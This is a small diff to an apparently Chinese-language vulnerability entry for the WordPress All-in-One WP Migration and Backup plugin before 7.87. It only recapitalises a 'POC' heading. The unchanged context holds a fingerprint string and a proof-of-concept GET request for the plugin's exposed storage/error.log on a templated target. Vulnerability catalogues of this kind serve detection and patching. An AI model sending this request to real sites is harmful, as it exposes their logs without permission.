@@ -5,7 +5,7 @@ WordPress 中的 All-in-One WP Migration and Backup 插件在 7.87 之前版本�
 body="/wp-content/plugins/all-in-one-wp-migration"
 ```
 
-## poc
+## POC
 ```
 GET /wp-content/plugins/all-in-one-wp-migration/storage/error.log HTTP/1.1
 Host: {{target}}
